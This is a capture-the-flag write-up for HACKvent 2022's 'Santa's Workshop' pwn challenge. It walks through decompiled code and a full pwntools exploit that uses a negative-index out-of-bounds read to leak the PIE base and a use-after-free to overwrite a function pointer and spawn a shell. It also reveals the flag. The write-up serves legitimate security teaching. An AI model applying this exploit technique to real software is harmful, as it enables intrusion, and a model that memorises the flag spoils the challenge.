# 21 - Santa's Workshop

## Description

Level: Hard<br/>
Author: 0xI

Santa decided to invite you to his workshop. Can you find a way to pwn it and find the flag?

## Solution

This was the only challenge that I wrote for HACKvent this year. We are given a binary as well as a remote service that
we have to pwn. As always with pwn challenges, I check the security settings:

```shell
pwn checksec santasworkshop.elf

[*] 'santasworkshop.elf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All security settings seem to be enabled. After this I quickly checked what the binary does. There are four options in
total. We can view the naughtly list, check the contents of the workshop, steal something and tell a good deed. If we
chose option 3 (steal) twice in a row, we get disconnected with the following message `free(): double free detected in
tcache 2`. This might be interesting later on.

At this point I opened the binary in ghidra and started reverse engineering. 
The important parts are:

```c
void present() {
  system("sh");
}

void steal() {
  puts("You tried to steal something...");
  puts("I\'m closing down the workshop now");
  *(workshop + 0x28) = 0xdeadc0de;
  free(workshop);
}

void naughty() {
  char list[3][30] = { "Flag Hoarder", "Flag Sharer", "Guessy Challenge Author" };

  puts("Tell me an index and I will show you the entry");
  int index = 0;
  int code = scanf("%d", &index);

  if (code == 1) {
    if (index < 3) {
      puts(&list + (index & 0xff) * 0x1e);
    }
    else {
      puts("I can\'t show you an entry that doesn\'t exist");
    }
  }
}

void tell_deed() {
  puts("How long is your deed?");

  ulong length = 0;
  int code = scanf("%zu", &length);

  if (code == 1) {
    if (length == 0 || 0x32 < length) {
      puts("Your deed is too short or too long for me to understand");
    } else {
      puts("Okay, tell me the deed");
      char* buf = malloc(length);
      read(0, buf, length);
      puts("Cool, maybe you get a flag");
    }
  }
}

void menu() {
  while (true) {
    printf("> ");
    int code = scanf("%d", &selection);
    if (code != 1) break;

    if (selection == 1) {
      naughty();
    } else if (selection == 2) {
      (workshop + 0x28)();
    } else if (selection == 3) {
      steal();
    } else if (selection == 4) {
      tell_deed();
    }
  }
}
```

We have a function `present` that gives us a shell. The only way we can call this function is if we select option
2 in the menu and have the address of that function at `workshop + 0x28`. The goal is clear, we need to obtain the
address of `present` and then find a way to write it to `workshop + 0x28`.

### Getting the address

To get the address we need a leak because the binary uses position independent code (PIE). A leak of some address on the
stack would be suitable. The `naughty` function is perfect for this:

```c
void naughty() {
  char list[3][30] = { "Flag Hoarder", "Flag Sharer", "Guessy Challenge Author" };

  puts("Tell me an index and I will show you the entry");
  int index = 0;
  int code = scanf("%d", &index);

  if (code == 1) {
    if (index < 3) {
      puts(&list + (index & 0xff) * 0x1e);
    }
    else {
      puts("I can\'t show you an entry that doesn\'t exist");
    }
  }
}
```

We can pass a negative index which is stored as an integer. Later on there's some kind of conversion happening (a cast
to `uint`) which allows us to get positive values again. The check `index < 3` is also bypassed by negative values. We
can run the binary locally with pwndbg to figure out the exact offset that we need.

We set a breakpoint:
```
   0x0000555555400bb3 <+272>:	call   0x5555554007f0 <puts@plt>
   0x0000555555400bb8 <+277>:	jmp    0x555555400bbb <naughty+280>
   0x0000555555400bba <+279>:	nop
   0x0000555555400bbb <+280>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555400bbf <+284>:	xor    rax,QWORD PTR fs:0x28
   0x0000555555400bc8 <+293>:	je     0x555555400bcf <naughty+300>
   0x0000555555400bca <+295>:	call   0x555555400800 <__stack_chk_fail@plt>
   0x0000555555400bcf <+300>:	leave
   0x0000555555400bd0 <+301>:	ret

pwndbg> break *0x0000555555400bb3
```

Inspect the stack:
```
pwndbg> stack 20
00:0000│ rsp         0x7fffffffe710 ◂— 0x12
01:0008│             0x7fffffffe718 ◂— 0x100000001
02:0010│ rcx         0x7fffffffe720 ◂— 'Flag Hoarder'
03:0018│             0x7fffffffe728 ◂— 0x72656472 /* 'rder' */
04:0020│             0x7fffffffe730 ◂— 0x0
05:0028│ rax-6 rdi-6 0x7fffffffe738 ◂— 0x6c46000000000000
06:0030│             0x7fffffffe740 ◂— 'ag Sharer'
07:0038│             0x7fffffffe748 ◂— 0x72 /* 'r' */
08:0040│             0x7fffffffe750 ◂— 0x0
09:0048│             0x7fffffffe758 ◂— 0x7365754700000000
0a:0050│             0x7fffffffe760 ◂— 'sy Challenge Author'
0b:0058│             0x7fffffffe768 ◂— 'enge Author'
0c:0060│             0x7fffffffe770 ◂— 0x726f68 /* 'hor' */
0d:0068│             0x7fffffffe778 —▸ 0x7ffff7e50000 (timer_getoverrun) ◂— endbr64
0e:0070│             0x7fffffffe780 —▸ 0x7ffff7f969c0 (_IO_2_1_stdin_) ◂— 0xfbad208b
0f:0078│             0x7fffffffe788 ◂— 0x1fa8b1c1dc7d7f00
10:0080│ rbp         0x7fffffffe790 —▸ 0x7fffffffe7b0 —▸ 0x7fffffffe7c0 ◂— 0x1
11:0088│             0x7fffffffe798 —▸ 0x555555400c93 (menu+91) ◂— jmp    0x555555400c4f
12:0090│             0x7fffffffe7a0 ◂— 0x100000001
```

At offset `0x88` we can see an address which we can leak. We simply have to calculate backwards now. The array starts at
offxet `0x10` and we want to get to `0x88`:

```python 
(0x88 - 0x10) // 0x1e
```

This outputs `4` but the computation also only takes the lower 255 bits of the number (`& 0xff`) therefore, we can take
`4 - 256 = -252` as our input. Just to verify that our computation is correct:

```python
hex((-252 & 0xff) * 0x1e + 0x10)
```

and it prints `0x88` as expected. Now we can use this to get the base address of our binary:

```python
from pwn import *

exe = context.binary = ELF('santas-workshop')

io = process([exe.path])
io.recvuntil(b'>')

with log.progress("Performing out of bounds read to leak address on the stack"):
    io.sendline(b'1')
    io.recvline()

    # Sending a negative number provokes an underflow
    # This allows us to send a number greater than 3
    io.sendline("-252".encode())
    res = io.recvline()[:-1]
    res = u64(res.ljust(8, b'\x00'))
    exe.address = res - (exe.sym['menu'] + 91)
    log.info(f"Pie base: {hex(exe.address)}")
```

### Writing the address

Earlier, we have seen that if we call `steal` twice, `free` would be called twice on the same address. This indicates,
that we might be able to trigger a use after free (UAF) vulnerability. There's two `malloc`s in our code. One occurs
during initialization, which we can't control, and one in the `tell_deed` function. If we `malloc` twice with the same
size the previously allocated memory will be reused and we can overwrite the content at `workshop + 0x28` to get
arbitrary code execution. 

### The exploit

Now that we have all the pieces together, we can run the exploit:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('santas-workshop')

io = process([exe.path])
io.recvuntil(b'>')

with log.progress("Performing out of bounds read to leak address on the stack"):
    io.sendline(b'1')
    io.recvline()

    # Sending a negative number provokes an underflow
    # This allows us to send a number greater than 3 (This is not allowed directly)
    io.sendline("-252".encode())
    res = io.recvline()[:-1]
    res = u64(res.ljust(8, b'\x00'))
    exe.address = res - (exe.sym['menu'] + 91)
    log.info(f"Pie base: {hex(exe.address)}")

with log.progress("Freeing global variable"):
    io.recvuntil(b'>')
    io.sendline(b'3') # frees the shop
    io.recvline()
    io.recvline()

with log.progress("Writing address of win function"):
    io.sendline(b'4')
    io.recvline()
    io.sendline(b'48') # Same size as the global variable -> forces re-use
    io.recvline()
    io.sendline(b'A' * 0x28 + p64(exe.sym['present'])) # address of the win function

with log.progress("Trigger UAF / arbitrary code excecution"):
    io.sendline(b'2')
    io.recvline()

io.interactive()
```

And we obtain the following flag file:
```
        ##############  ##    ####  ####    ##############
        ##          ##  ######  ######  ##  ##          ##
        ##  ######  ##      ##############  ##  ######  ##
        ##  ######  ##      ##    ####  ##  ##  ######  ##
        ##  ######  ##  ########        ##  ##  ######  ##
        ##          ##  ##    ##    ##  ##  ##          ##
        ##############  ##  ##  ##  ##  ##  ##############
                        ##  ######  ######
        ######    ####  ######    ######  ########    ####
        ####  ####    ##  ####    ##    ######        ####
        ######      ######    ##      ##    ##    ##  ####
        ####  ##      ##  ##      ##  ####    ####      ##
            ####  ####    ##  ######        ##  ##      ##
          ##              ##    ##      ####  ##      ##
        ####    ##  ########    ########      ##  ##    ##
            ##        ##      ####  ####  ##########
        ####  ########  ##        ################    ##
                        ##        ########      ##  ##
        ##############    ##  ##        ##  ##  ##      ##
        ##          ##  ######    ##    ##      ####  ####
        ##  ######  ##    ##  ######  ############  ######
        ##  ######  ##      ##  ##        ##          ##
        ##  ######  ##  ######  ########    ##  ##########
        ##          ##  ##    ####  ##    ##  ######
        ##############  ##        ####  ######  ##  ##  ##
```

All we have to do now is to make it better readable and scan the QR code to get the flag `HV22{PWN_4_TH3_W1n}`.

